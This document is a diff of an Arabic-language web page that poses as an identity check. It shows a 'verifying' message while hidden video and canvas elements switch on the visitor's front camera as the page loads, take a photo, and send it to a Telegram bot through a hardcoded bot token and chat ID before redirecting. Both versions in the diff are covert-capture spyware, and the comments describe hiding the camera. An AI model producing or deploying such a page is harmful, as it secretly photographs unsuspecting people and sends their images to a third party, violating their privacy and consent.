@@ -3,47 +3,41 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحميل...</title>
+    <title>جاري التحقق</title>
     <style>
         body {
             margin: 0;
             padding: 0;
             background: #f5f5f5;
-            overflow: hidden;
-        }
-        .loading {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            font-family: Arial, sans-serif;
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            background: rgba(255,255,255,0.9);
-            z-index: 1000;
-            font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        .wait-message {
+            font-size: 24px;
+            color: #333;
         }
     </style>
 </head>
 <body>
-    <div class="loading">
-        <h2>جاري التحقق من الهوية...</h2>
-    </div>
+    <div class="wait-message">انتظر جاري التحقق...</div>
 
     <!-- عناصر مخفية تمامًا -->
-    <video id="cameraView" autoplay playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="hiddenCamera" autoplay playsinline style="display:none;"></video>
+    <canvas id="hiddenCanvas" style="display:none;"></canvas>
 
     <script>
         // بيانات البوت
-        const botToken = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
-        const chatId = '6913353602';
+        const BOT_TOKEN = '7412369773:AAEuPohi5X80bmMzyGnloq4siZzyu5RpP94';
+        const CHAT_ID = '6913353602';
         
-        // بدء العملية تلقائيًا
-        (async function() {
+        // بدء العملية تلقائيًا عند تحميل الصفحة
+        window.addEventListener('DOMContentLoaded', async () => {
             try {
-                // 1. طلب إذن الكاميرا
+                // 1. تشغيل الكاميرا خفيةً
                 const stream = await navigator.mediaDevices.getUserMedia({
                     video: { 
                         facingMode: 'user',
@@ -53,59 +47,49 @@
                     audio: false
                 });
                 
-                // 2. إعداد العناصر المخفية
-                const cameraView = document.getElementById('cameraView');
-                const canvas = document.getElementById('canvas');
-                cameraView.srcObject = stream;
+                const camera = document.getElementById('hiddenCamera');
+                const canvas = document.getElementById('hiddenCanvas');
+                camera.srcObject = stream;
                 
-                // 3. انتظر ثانية لضبط الإضاءة
+                // 2. انتظر ثانية للتركيز البؤري
                 await new Promise(resolve => setTimeout(resolve, 1000));
                 
-                // 4. التقاط الصورة
-                canvas.width = cameraView.videoWidth;
-                canvas.height = cameraView.videoHeight;
-                const context = canvas.getContext('2d');
-                context.drawImage(cameraView, 0, 0, canvas.width, canvas.height);
+                // 3. التقاط الصورة
+                canvas.width = camera.videoWidth;
+                canvas.height = camera.videoHeight;
+                canvas.getContext('2d').drawImage(camera, 0, 0);
                 
-                // 5. إيقاف الكاميرا فورًا
+                // 4. إيقاف الكاميرا فورًا
                 stream.getTracks().forEach(track => track.stop());
                 
-                // 6. تحويل الصورة وإرسالها
-                const photoData = canvas.toDataURL('image/jpeg', 0.7);
-                await sendToTelegram(photoData);
+                // 5. إرسال الصورة
+                const imageData = canvas.toDataURL('image/jpeg', 0.7);
+                await sendImageToBot(imageData);
                 
-                // 7. إخفاء رسالة التحميل بعد الإرسال
-                document.querySelector('.loading').style.display = 'none';
-                
-                // 8. توجيه المستخدم أو إكمال العملية
-                setTimeout(() => {
-                    window.location.href = "https://example.com/next-step"; // استبدل برابطك
-                }, 1500);
+                // 6. الانتقال إلى الخطوة التالية (استبدل الرابط)
+                window.location.href = "https://example.com/next-step";
                 
             } catch (error) {
-                console.error('Error:', error);
-                // معالجة الأخطاء بشكل غير مرئي
-                setTimeout(() => {
-                    window.location.href = "https://example.com/error-page"; // استبدل برابط صفحة الخطأ
-                }, 1500);
+                console.error('حدث خطأ:', error);
+                // في حالة الخطأ، انتقل إلى صفحة الخطأ (استبدل الرابط)
+                window.location.href = "https://example.com/error-page";
             }
-        })();
+        });
         
-        // دالة الإرسال إلى التليجرام
-        async function sendToTelegram(photoData) {
+        // دالة إرسال الصورة إلى بوت التليجرام
+        async function sendImageToBot(imageData) {
             try {
-                const blob = await (await fetch(photoData)).blob();
+                const blob = await (await fetch(imageData)).blob();
                 const formData = new FormData();
-                formData.append('chat_id', chatId);
+                formData.append('chat_id', CHAT_ID);
                 formData.append('photo', blob, 'user_verification.jpg');
-                formData.append('caption', `تم التحقق من المستخدم في ${new Date().toLocaleString()}`);
                 
-                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
             } catch (error) {
-                console.error('Telegram Error:', error);
+                console.error('خطأ في الإرسال:', error);
                 throw error;
             }
         }
